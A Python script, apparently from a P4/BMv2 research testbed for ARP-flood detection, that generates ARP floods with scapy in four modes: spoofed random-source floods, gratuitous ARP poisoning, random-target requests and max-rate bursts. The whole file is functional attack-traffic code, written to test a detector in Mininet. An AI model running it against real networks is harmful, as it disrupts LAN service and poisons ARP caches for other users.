#!/usr/bin/env python3
"""
arp_flood.py  —  ARP flood attack simulator for BMv2 testbed

Usage (from inside Mininet CLI):
    mininet> h1 python3 /opt/p4work/arp_flood_detection/attack/arp_flood.py \
                 --iface h1-eth0 --count 10000 --mode spoof

Modes:
    spoof    : randomized sender MAC + IP   (simulates distributed ARP flood)
    gratuit  : gratuitous ARPs from real host  (simulates poisoning attack)
    request  : plain broadcast ARP requests for random targets
    burst    : fixed target, max speed, real src (simulates rate-based attack)

Examples:
    # 20k spoofed ARPs — the main "attack" demo
    h1 python3 .../arp_flood.py --iface h1-eth0 --count 20000 --mode spoof

    # Slow trickle (1 pkt every 10 ms) so you can watch the CSV build up live
    h1 python3 .../arp_flood.py --iface h1-eth0 --count 500 --mode spoof --delay 0.01

    # Gratuitous ARP poisoning attempt
    h1 python3 .../arp_flood.py --iface h1-eth0 --count 5000 --mode gratuit
"""

import argparse
import random
import sys
import time

try:
    from scapy.all import Ether, ARP, sendp, get_if_hwaddr, get_if_addr
except ImportError:
    sys.stderr.write("scapy not installed. Run: sudo pip3 install scapy\n")
    sys.exit(1)


def build_spoof(target_ip):
    """Random src MAC and src IP — distributed flood / spoof."""
    src_mac = "00:de:ad:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )
    src_ip = "10.%d.%d.%d" % (
        random.randint(1, 2),
        random.randint(1, 254),
        random.randint(1, 254),
    )
    return (Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
            ARP(op=1, hwsrc=src_mac, psrc=src_ip,
                hwdst="00:00:00:00:00:00", pdst=target_ip))


def build_gratuitous(real_mac, real_ip):
    """Gratuitous ARP — sender_ip == target_ip, broadcast."""
    return (Ether(src=real_mac, dst="ff:ff:ff:ff:ff:ff") /
            ARP(op=1, hwsrc=real_mac, psrc=real_ip,
                hwdst="ff:ff:ff:ff:ff:ff", pdst=real_ip))


def build_request(real_mac, real_ip):
    """Normal ARP request for a random target IP in the /8."""
    tgt_ip = "10.%d.%d.%d" % (
        random.randint(1, 2),
        random.randint(1, 254),
        random.randint(1, 254),
    )
    return (Ether(src=real_mac, dst="ff:ff:ff:ff:ff:ff") /
            ARP(op=1, hwsrc=real_mac, psrc=real_ip,
                hwdst="00:00:00:00:00:00", pdst=tgt_ip))


def build_burst(real_mac, real_ip, target_ip):
    """Fixed target, real source — pure rate-based flood."""
    return (Ether(src=real_mac, dst="ff:ff:ff:ff:ff:ff") /
            ARP(op=1, hwsrc=real_mac, psrc=real_ip,
                hwdst="00:00:00:00:00:00", pdst=target_ip))


def main():
    ap = argparse.ArgumentParser(description="ARP flood simulator")
    ap.add_argument("--iface", required=True,
                    help="Interface to send on (e.g. h1-eth0)")
    ap.add_argument("--count", type=int, default=10000,
                    help="Number of ARP packets (default: 10000)")
    ap.add_argument("--mode", choices=["spoof", "gratuit", "request", "burst"],
                    default="spoof", help="Attack mode (default: spoof)")
    ap.add_argument("--target", default="10.2.1.1",
                    help="Target IP for spoof/burst modes (default: 10.2.1.1)")
    ap.add_argument("--delay", type=float, default=0.0,
                    help="Seconds between packets (default: 0 = max speed)")
    args = ap.parse_args()

    # Grab real MAC/IP of the sending interface (needed for non-spoof modes)
    try:
        real_mac = get_if_hwaddr(args.iface)
        real_ip = get_if_addr(args.iface)
    except Exception as e:
        sys.stderr.write(f"Failed to read iface {args.iface}: {e}\n")
        sys.exit(1)

    print(f"[arp_flood] iface={args.iface}  src_mac={real_mac}  src_ip={real_ip}")
    print(f"[arp_flood] mode={args.mode}  count={args.count}  "
          f"target={args.target}  delay={args.delay}s")

    # Build packets ahead of time for max throughput
    print("[arp_flood] building packet batch...")
    pkts = []
    for _ in range(args.count):
        if args.mode == "spoof":
            pkts.append(build_spoof(args.target))
        elif args.mode == "gratuit":
            pkts.append(build_gratuitous(real_mac, real_ip))
        elif args.mode == "request":
            pkts.append(build_request(real_mac, real_ip))
        elif args.mode == "burst":
            pkts.append(build_burst(real_mac, real_ip, args.target))

    print(f"[arp_flood] firing {args.count} packets...")
    t0 = time.time()

    if args.delay > 0:
        # Paced send — one at a time
        for p in pkts:
            sendp(p, iface=args.iface, verbose=False)
            time.sleep(args.delay)
    else:
        # Max-speed batch send
        sendp(pkts, iface=args.iface, verbose=False)

    dt = time.time() - t0
    rate = args.count / dt if dt > 0 else 0
    print(f"[arp_flood] sent {args.count} packets in {dt:.2f}s "
          f"(~{rate:.0f} pkt/s)")


if __name__ == "__main__":
    main()
